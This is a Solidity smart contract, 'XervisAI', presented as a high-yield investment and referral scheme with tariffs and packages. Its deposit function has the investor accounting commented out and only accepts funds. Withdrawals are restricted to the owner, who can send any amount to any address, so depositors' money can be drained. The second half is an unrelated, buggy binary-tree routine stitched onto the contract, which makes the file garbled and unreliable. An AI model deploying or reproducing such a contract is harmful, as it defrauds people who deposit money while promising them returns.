//SourceUnit: XervisAI.sol

pragma solidity >=0.4.23 <0.6.0;

contract XervisAI{
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint balanceRef;
    uint totalRef;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
  }

  struct GreenJacpot{
      address referer;
      address r_1;
      address r_2;
      uint c_1;
      uint c_2;
      uint total;
      uint rentr;
  }
  
  struct RedJackpot {
      address referer;
      address r_1;
      address r_2; 
      uint c_1;
      uint c_2;
      uint total;
      uint rentr;
  }
  
  struct AI_POOL{
      address[] referer;
      uint amount;
  }

  uint PACKAGE_SMART_BRONGE = 25;
  uint PACKAGE_FIRST_SILVER = 50;
  uint PACKAGE_GLITERING_GOLD = 100;
  uint PACKAGE_CROWN = 275;
  uint PACKAGE_AMBASSADOR = 550;
  uint PACKAGE_XERVIS = 1100;
  address owner;
  
  uint MIN_DEPOSIT = 25;
  uint DIRECT_INCOME = 20;
  
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
         
        //   reca = GreenJacpot[rec].referer;
        //   recb = RedJackpot[rec].referer;
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  constructor() public {
    tariffs.push(Tariff(4 * 28800, 156));
    tariffs.push(Tariff(6 * 28800, 216));
    tariffs.push(Tariff(8 * 28800, 264));
    tariffs.push(Tariff(10 * 28800, 300));
    
    for (uint i = 4; i >= 1; i--) {
      refRewards.push(i);
    }
    owner = msg.sender;
  }
  
  modifier onlyOwner() {
         require(msg.sender==owner);
         _;
     }
  function deposit(uint tariff, address referer) external payable {
    // require(block.number >= START_AT);
    // require(msg.value >= MIN_DEPOSIT);
    // require(tariff < tariffs.length);
    
    // register(referer);
    // support.transfer(msg.value);
    // rewardReferers(msg.value, investors[msg.sender].referer);
    
    // investors[msg.sender].invested += msg.value;
    // totalInvested += msg.value;
    
    // investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }
  
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw(uint amount, address user) external onlyOwner{
    // uint amount = profit();
    // if (msg.sender.send(amount)) {
    //   investors[msg.sender].withdrawn += amount;
      user.transfer(amount);
      emit Withdraw(user, amount);
    // }
  }
  
  function via(address where) external payable {
    where.transfer(msg.value);
  }
  
  function Coins()
{
    head=0;
    ind_xy=0;
    ind=1;
    Btree[0].left=0;
    Btree[0].right=0;
}
     struct Node 
    {
     uint key;
     uint left;
     uint right;
     uint[10] y_arr;
     uint index; 
     }
uint[100] public x;
uint ind_xy;
uint[100] public y;
Node[100] public Btree;
uint public head;
uint public ind;

function max(int a, int b) returns (int)
{
return (a > b)? a : b;
}
function search_x(uint r, uint key,uint key_y) returns (uint)
{
  if(Btree[r].key==key)
  {
      for(uint i=0;i<Btree[r].index;i++)
      {
          if(Btree[r].y_arr[i]==key_y)
          return r;
      }
      return 0;
  }
  else if(Btree[r].key>key)
  {
      if(Btree[r].left!=0)
      return search_x(Btree[r].left,key,key_y);
      else return 0;
  }
  else
   {
      if(Btree[r].right!=0)
      return search_x(Btree[r].right,key,key_y);
      else return 0;
   }
}
function search_y(uint r, uint key,uint key_y) returns (uint)
{
  if(Btree[r].key==key)
  {
      for(uint i=0;i<Btree[r].index;i++)
      {
          if(Btree[r].y_arr[i]==key_y)
          return i;
      }
      return 0;
  }
  else if(Btree[r].key>key)
       {
      if(Btree[r].left!=0)
      return search_x(Btree[r].left,key,key_y);
      else return 0;
       }
  else
  {
      if(Btree[r].right!=0)
      return search_y(Btree[r].right,key,key_y);
      else return 0;
  }
}
function sear(uint r,uint key) returns (uint)
{
        for(;;)
{
if (key < Btree[r].key)
{
if(Btree[r].left==0)
{
  return r;
}
else
r=Btree[r].left;
}
else if (key > Btree[r].key)
{
    if(Btree[r].right==0)
    {
   return r;
    }
else
    r=Btree[r].right;
}
else {
    return r;
}
}
}
function insert(uint r, uint key,uint key_y) 
{
if (head==0)
{
    Btree[ind].key=key;
    Btree[ind].left=0;
    Btree[ind].right=0;
    Btree[ind].y_arr[Btree[ind].index]=key_y;
    Btree[ind].index=Btree[ind].index+1;
    head=1;
}
else
{
if (key < Btree[r].key)
{
    ind=ind+1;
    Btree[r].left=ind;
    Btree[ind].left=0;
    Btree[ind].right=0;
    Btree[ind].key=key;
    Btree[ind].y_arr[Btree[ind].index]=key_y;
    Btree[ind].index=Btree[ind].index+1;
}
else if (key > Btree[r].key)
{
    ind=ind+1;
    Btree[r].right=ind;
    Btree[ind].left=0;
    Btree[ind].right=0; 
    Btree[Btree[r].right].key=key;
    Btree[ind].y_arr[Btree[ind].index]=key_y;
    Btree[ind].index=Btree[ind].index+1;
}
else {
    Btree[r].y_arr[Btree[r].index]=key_y;
    Btree[r].index=Btree[r].index+1;
}

}
return;
}
function push_y(uint x_x,uint y1,uint y2)
{
   for(uint i=0;i<Btree[x_x].index;i++)
   {
       if(Btree[x_x].y_arr[i]<=y2&& Btree[x_x].y_arr[i]>=y1)
        {
            x[ind_xy]=Btree[x_x].key;
            y[ind_xy++]=Btree[x_x].y_arr[i];
        }
   }
}
function searchlist(uint root,uint x1,uint x2,uint y1,uint y2) 
{
    uint r_k=Btree[root].key;
     if(Btree[root].left==0 &&Btree[root].right==0&& r_k==0)
       return;
    if(r_k>x2 && r_k>x1)
         searchlist(Btree[root].left,x1,x2,y1,y2);
    else if(r_k<x2 && r_k<x1)
         searchlist(Btree[root].right,x1,x2,y1,y2);
    else if(r_k>=x1&& r_k<=x2)
    {
        push_y(root,y1,y2);
        searchlist(Btree[root].left,x1,x2,y1,y2);
        searchlist(Btree[root].right,x1,x2,y1,y2);
    }
}
 function deletenode(uint root,uint key) returns (uint)
      {
             if(Btree[root].key==key)
             {
                uint x=root;
               if(Btree[x].left==0&&Btree[x].right==0)
              {
                Btree[x].key=0;
                return 0;
              }
              else if(Btree[x].left==0)
              {
                  Btree[x].key=Btree[Btree[x].right].key;
                  Btree[x].index=Btree[Btree[x].right].index;
                  for(uint i=0;i<Btree[Btree[x].right].index;i++)
                  {
                       Btree[x].y_arr[i]= Btree[Btree[x].right].y_arr[i];
                  }
                  Btree[x].right=deletenode(Btree[x].right,Btree[Btree[x].right].key);
              }
               else 
              {
                  Btree[x].key=Btree[Btree[x].left].key;
                  Btree[x].index=Btree[Btree[x].left].index;
                  for(uint j=0;j<Btree[Btree[x].left].index;j++)
                  {
                       Btree[x].y_arr[j]= Btree[Btree[x].left].y_arr[j];
                  }
                  Btree[x].left=deletenode(Btree[x].left,Btree[Btree[x].left].key);
              }  
             }
             else if(Btree[root].key>key)
             Btree[root].left=deletenode(Btree[root].left,key);
             else
             Btree[root].right=deletenode(Btree[root].right,key);
          
      }
 function deletekey(uint root,uint key,uint key_y) returns(uint)
      {
          uint x=search_x(root,key,key_y);
          uint y=search_y(root,key,key_y);
          if(x==0)
            return 0;
          else
          {
              if(Btree[x].index==1)
              {
                deletenode(root,key);
              }
              else
              {
                for(uint i=y;i<Btree[x].index-1;i++)
                {
                    Btree[x].y_arr[i]=Btree[x].y_arr[i+1];
                }
                 Btree[x].index--;
              }
              return x;
          }
      }
function minValueNode(uint root) returns (uint)
{
uint current = root;
while (Btree[current].left != 0)
current =Btree[current].left;

return Btree[current].key;
}
}